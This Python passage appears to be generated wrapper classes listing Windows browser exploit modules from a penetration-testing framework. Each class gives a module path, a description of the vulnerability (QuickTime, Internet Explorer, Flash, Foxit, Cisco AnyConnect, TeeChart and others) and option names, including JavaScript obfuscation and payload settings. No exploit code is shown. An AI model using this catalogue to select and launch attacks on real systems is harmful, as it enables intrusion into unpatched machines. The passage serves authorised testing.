		path = 'windows/browser/firefox_smil_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'
			required_UsePostHTML = 'UsePostHTML'

	class windows_browser_apple_quicktime_marshaled_punk(object):
		"""
		
          This module exploits a memory trust issue in Apple QuickTime
        7.6.7. When processing a specially-crafted HTML page, the QuickTime ActiveX
        control will treat a supplied parameter as a trusted pointer. It will
        then use it as a COM-type pUnknown and lead to arbitrary code execution.

        This exploit utilizes a combination of heap spraying and the
        QuickTimeAuthoring.qtx module to bypass DEP and ASLR. This module does not
        opt-in to ASLR. As such, this module should be reliable on all Windows
        versions.

        NOTE: The addresses may need to be adjusted for older versions of QuickTime.
      
		"""

		path = 'windows/browser/apple_quicktime_marshaled_punk'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_cisco_anyconnect_exec(object):
		"""
		
          This module exploits a vulnerability in the Cisco AnyConnect VPN client
        vpnweb.ocx ActiveX control. This control is typically used to install the
        VPN client. An attacker can set the 'url' property which is where the control
        tries to locate the files needed to install the client.

          The control tries to download two files from the site specified within the
        'url' property. One of these files it will be stored in a temporary directory and
        executed.
          
		"""

		path = 'windows/browser/cisco_anyconnect_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_ie_cbutton_uaf(object):
		"""
		
          This module exploits a vulnerability found in Microsoft Internet Explorer. A
        use-after-free condition occurs when a CButton object is freed, but a reference
        is kept and used again during a page reload, an invalid memory that's controllable
        is used, and allows arbitrary code execution under the context of the user.

          Please note: This vulnerability has been exploited in the wild targeting
        mainly China/Taiwan/and US-based computers.
      
		"""

		path = 'windows/browser/ie_cbutton_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_awingsoft_winds3d_sceneurl(object):
		"""
		
          This module exploits an untrusted program execution vulnerability within the
        Winds3D Player from AwingSoft. The Winds3D Player is a browser plugin for
        IE (ActiveX), Opera (DLL) and Firefox (XPI). By setting the 'SceneURL'
        parameter to the URL to an executable, an attacker can execute arbitrary
        code.

        Testing was conducted using plugin version 3.5.0.9 for Firefox 3.5 and
        IE 8 on Windows XP SP3.
      
		"""

		path = 'windows/browser/awingsoft_winds3d_sceneurl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_ms10_018_ie_tabular_activex(object):
		"""
		
          This module exploits a memory corruption vulnerability in the Internet Explorer
        Tabular Data ActiveX Control. Microsoft reports that version 5.01 and 6 of Internet
        Explorer are vulnerable.

        By specifying a long value as the "DataURL" parameter to this control, it is possible
        to write a NUL byte outside the bounds of an array. By targeting control flow data
        on the stack, an attacker can execute arbitrary code.
      
		"""

		path = 'windows/browser/ms10_018_ie_tabular_activex'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms09_002_memory_corruption(object):
		"""
		
        This module exploits an error related to the CFunctionPointer function when attempting
        to access uninitialized memory. A remote attacker could exploit this vulnerability to
        corrupt memory and execute arbitrary code on the system with the privileges of the victim.
      
		"""

		path = 'windows/browser/ms09_002_memory_corruption'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_flashplayer_avm(object):
		"""
		
          This module exploits a vulnerability in Adobe Flash Player versions 10.2.152.33
        and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification
        logic. This results in unsafe JIT(Just-In-Time) code being executed.  This is the same
        vulnerability that was used for the RSA attack in March 2011.

          Specifically, this issue results in uninitialized memory being referenced and later
        executed. Taking advantage of this issue relies on heap spraying and controlling the
        uninitialized memory.

          Currently this exploit works for IE6, IE7, and Firefox 3.6 and likely several
        other browsers. DEP does catch the exploit and causes it to fail. Due to the nature
        of the uninitialized memory its fairly difficult to get around this restriction.
        
		"""

		path = 'windows/browser/adobe_flashplayer_avm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_aol_icq_downloadagent(object):
		"""
		
          This module allows remote attackers to download and execute arbitrary files
        on a users system via the DownloadAgent function of the ICQPhone.SipxPhoneManager ActiveX control.
      
		"""

		path = 'windows/browser/aol_icq_downloadagent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_foxit_reader_plugin_url_bof(object):
		"""
		
          This module exploits a vulnerability in the Foxit Reader Plugin, it exists in
          the npFoxitReaderPlugin.dll module. When loading PDF files from remote hosts,
          overly long query strings within URLs can cause a stack-based buffer overflow,
          which can be exploited to execute arbitrary code. This exploit has been tested
          on Windows 7 SP1 with Firefox 18.0 and Foxit Reader version 5.4.4.11281
          (npFoxitReaderPlugin.dll version 2.2.1.530).
      
		"""

		path = 'windows/browser/foxit_reader_plugin_url_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_autodesk_idrop(object):
		"""
		
          This module exploits a heap-based memory corruption vulnerability in
        Autodesk IDrop ActiveX control (IDrop.ocx) version 17.1.51.160.
        An attacker can execute arbitrary code by triggering a heap use after
        free condition using the Src, Background, PackageXml properties.
      
		"""

		path = 'windows/browser/autodesk_idrop'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_indusoft_issymbol_internationalseparator(object):
		"""
		
        This module exploits a heap overflow found in InduSoft Web Studio <= 61.6.00.00
        SP6. The overflow exists in the ISSymbol.ocx,  and can be triggered with a long
        string argument for the InternationalSeparator() method of the ISSymbol control.
        This modules uses the msvcr71.dll form the Java JRE6 to bypass ASLR.
      
		"""

		path = 'windows/browser/indusoft_issymbol_internationalseparator'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_trendmicro_officescan(object):
		"""
		
          This module exploits a stack buffer overflow in Trend Micro OfficeScan
        Corporate Edition 7.3. By sending an overly long string to the
        "CgiOnUpdate()" method located in the OfficeScanSetupINI.dll Control,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/trendmicro_officescan'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_teechart_pro(object):
		"""
		
          This module exploits a integer overflow in TeeChart Pro ActiveX control. When
        sending an overly large/negative integer value to the AddSeries() property of
        TeeChart2010.ocx, the code will perform an arithemetic operation that wraps the
        value and is later directly trusted and called upon.

        This module has been designed to bypass DEP only under IE8 with Java support. Multiple
        versions (including the latest version) are affected by this vulnerability that date
        back to as far as 2001.

        The following controls are vulnerable:

        TeeChart5.ocx Version 5.0.1.0 (clsid: B6C10489-FB89-11D4-93C9-006008A7EED4);
        TeeChart6.ocx Version 6.0.0.5 (clsid: 536600D3-70FE-4C50-92FB-640F6BFC49AD);
        TeeChart7.ocx Version 7.0.1.4 (clsid: FAB9B41C-87D6-474D-AB7E-F07D78F2422E);
        TeeChart8.ocx Version 8.0.0.8 (clsid: BDEB0088-66F9-4A55-ABD2-0BF8DEEC1196);
        TeeChart2010.ocx Version 2010.0.0.3 (clsid: FCB4B50A-E3F1-4174-BD18-54C3B3287258).

        The controls are deployed under several SCADA based systems including:

        Unitronics OPC server v1.3;
        BACnet Operator Workstation Version 1.0.76
      
		"""

		path = 'windows/browser/teechart_pro'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_awingsoft_web3d_bof(object):
		"""
		
          This module exploits a data segment buffer overflow within Winds3D Viewer of
        AwingSoft Awakening 3.x (WindsPly.ocx v3.6.0.0). This ActiveX is a plugin of
        AwingSoft Web3D Player.
        By setting an overly long value to the 'SceneURL' property, an attacker can
        overrun a buffer and execute arbitrary code.
      
		"""

		path = 'windows/browser/awingsoft_web3d_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ask_shortformat(object):
		"""
		
          This module exploits a stack buffer overflow in Ask.com Toolbar 4.0.2.53.
        An attacker may be able to excute arbitrary code by sending an overly
        long string to the "ShortFormat()" method in askbar.dll.
      
		"""

		path = 'windows/browser/ask_shortformat'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_hp_loadrunner_addfile(object):
		"""
		
          This module exploits a stack buffer overflow in Persits Software Inc's
        XUpload ActiveX control(version 3.0.0.3) thats included in HP LoadRunner 9.5.
        By passing an overly long string to the AddFile method, an attacker may be
        able to execute arbitrary code.
      
		"""

		path = 'windows/browser/hp_loadrunner_addfile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_msvidctl_mpeg2(object):
		"""
		
          This module exploits a memory corruption within the MSVidCtl component of Microsoft
        DirectShow (BDATuner.MPEG2TuneRequest).
        By loading a specially crafted GIF file, an attacker can overrun a buffer and
        execute arbitrary code.

        ClassID is now configurable via an advanced option (otherwise randomized) - I)ruid
      
		"""

		path = 'windows/browser/msvidctl_mpeg2'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			ClassID = 'ClassID'

	class windows_browser_adobe_flash_pcre(object):
		"""
		
        This module exploits a vulnerability found in Adobe Flash Player. A compilation logic error
        in the PCRE engine, specifically in the handling of the /c escape sequence when followed by
        a multi-byte UTF8 character, allows arbitrary execution of PCRE bytecode.
      
		"""

		path = 'windows/browser/adobe_flash_pcre'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
